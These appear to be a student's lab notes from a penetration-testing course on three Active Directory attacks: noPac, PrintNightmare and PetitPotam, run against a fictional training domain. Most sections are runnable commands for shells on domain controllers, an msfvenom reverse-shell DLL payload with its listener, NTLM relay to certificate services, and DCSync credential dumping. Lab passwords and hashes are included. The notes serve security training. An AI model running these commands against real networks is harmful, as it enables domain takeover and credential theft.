- At the time of writing (April 2022), **the three techniques shown in this section are relatively recent** (within the last 6-9 months).
- These are advanced topics that can not be covered thoroughly in one module section. The purpose of demonstrating these attacks is to allow students to try out the latest and greatest attacks in a controlled lab environment

# NoPac (SamAccountName Spoofing)
---
- A great example of an emerging threat is the **[Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)**, also called **`noPac` or referred to as `SamAccountName Spoofing`** released at the end of 2021.
- This vulnerability **encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)**, allowing for **==intra-domain privilege escalation from any standard domain user to Domain Admin level access==** in one single command.
	- ![[Pasted image 20250813063543.png]]
- This exploit path takes advantage of being able to **==change the `SamAccountName` of a computer account to that of a Domain Controller.==**
- By default, authenticated users **can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain)**
- When doing so, **we change the name of the new host to match a Domain Controller's SamAccountName.**
- Once done, we must ==**request Kerberos tickets causing the service to issue us tickets under the DC's name**== instead of the new name.
- **Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.** The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).
- We can **use this [tool](https://github.com/Ridter/noPac) to perform this attack**. This tool is present on the ATTACK01 host in `/opt/noPac`.
- Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:

## Cloning the NoPac Exploit Repo
- `git clone https://github.com/Ridter/noPac.git`
- We'll also notice the **`ms-DS-MachineAccountQuota` number is set to 10**. 
- In some environments, an astute **sysadmin ==may set the `ms-DS-MachineAccountQuota` value to 0**.== 
- If this is the case, **==the attack will fail because our user will not have the rights to add a new machine account.==**

## Scanning for NoPac
- `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`
	- ![[Pasted image 20250813064005.png]]
- If **==we Get TGT, it means that system is vulnerable.==**

## Running NoPac & Getting a Shell
- `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`
	- ![[Pasted image 20250813064150.png]]
- We can also use the **tool with the `-dump` flag to perform a DCSync using secretsdump.py.**
## Using noPac to DCSync the Built-in Administrator Account
- `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`

# PrintNightmare
----
- `PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) **found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems.**
- Using this vulnerability for **local privilege escalation** is covered in the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module, but is also important to practice within the context of Active Directory environments for gaining **remote access to a host.**
- In this case, we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit. We can use Git to clone it to our attack host:

## Cloning the Exploit
- `git clone https://github.com/cube0x0/CVE-2021-1675.git`
## Install cube0x0's Version of Impacket -  ==CAREFUL==
- `pip3 uninstall impacket`
- `git clone https://github.com/cube0x0/impacket`
- `cd impacket`
- `python3 ./setup.py install`
- We can **use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.**

## Enumerating for MS-RPRN
- `rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'`
- ![[Pasted image 20250813065512.png]]

## Generating a DLL Payload
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll`
## Creating a Share with smbserver.py
- `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`
## Configuring & Starting MSF multi/handler
- `use exploit/multi/handler`
- `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
- `set LHOST 172.16.5.225`
- `set LPORT 8080`
- `run`

## Running the Exploit
- `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'`

## Getting the SYSTEM Shell
- ![[Pasted image 20250813065702.png]]

# PetitPotam (MS-EFSRPC)
--- 
 - PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an **LSA spoofing vulnerability that was patched in August of 2021.**
 - The flaw **allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM** over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31).
 - This technique allows an unauthenticated attacker to take over a **Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use**.

## Starting ntlmrelayx.py
- `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`

In **another window, we can run the tool [PetitPotam.py]**(https://github.com/topotam/PetitPotam)

## Running PetitPotam.py
- `python3 PetitPotam.py 172.16.5.225 172.16.5.5`
- ![[Pasted image 20250813070123.png]]

## Catching Base64 Encoded Certificate for DC01
- Back in our other window, **we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller** if the attack is successful.
- ![[Pasted image 20250813070225.png]]

## Requesting a TGT Using gettgtpkinit.py
- Next, **we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.**
	- `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache`

## Setting the KRB5CCNAME Environment Variable
- `export KRB5CCNAME=dc01.ccache`

## Using Domain Controller TGT to DCSync
- We can then **use this TGT with `secretsdump.py` to perform a DCSync** and retrieve one or all of the NTLM password hashes for the domain.
- `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`

We could also use a **more straightforward command:** `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the **tool will retrieve the username from the ccache file.**

## Running klist
- `klist`

## Confirming Admin Access to the Domain Controller
- `crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`

## Submitting a TGS Request for Ourselves Using getnthash.py
- We can also take an **alternate route once we have the TGT for our target.**
- Using the **tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U** to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target.
	- `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`
	- We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.
## Using Domain Controller NTLM Hash to DCSync
- `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`